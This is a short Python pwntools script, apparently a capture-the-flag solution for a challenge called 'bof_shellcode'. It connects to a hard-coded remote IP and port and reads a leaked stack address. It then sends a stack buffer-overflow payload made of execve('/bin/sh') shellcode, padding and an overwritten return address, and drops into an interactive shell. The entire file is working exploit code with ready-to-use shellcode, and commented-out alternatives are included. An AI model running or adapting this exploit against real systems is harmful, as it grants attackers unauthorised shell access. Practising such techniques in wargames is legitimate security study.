from pwn import *

# This code works (2023.11.16)

context.log_level='debug'

# p = process('./bof_shellcode')
p = remote('141.164.48.98', '30003')

p.recvuntil(':')
given = p.recvline()
# print(given[1:-1])
address = int(given, 16)

# shellcode = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'
# shellcode = b'\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x40\x40\x78\x44\x0c\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x01\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload = shellcode
payload += b'B' * (0xE0 - len(payload))

payload += address.to_bytes(8, 'little')
payload += address.to_bytes(8, 'little')

# pause()
p.sendline(payload)

with open("bof_shellcode_payload.txt", "wb") as f:
    f.write(payload)

p.interactive()
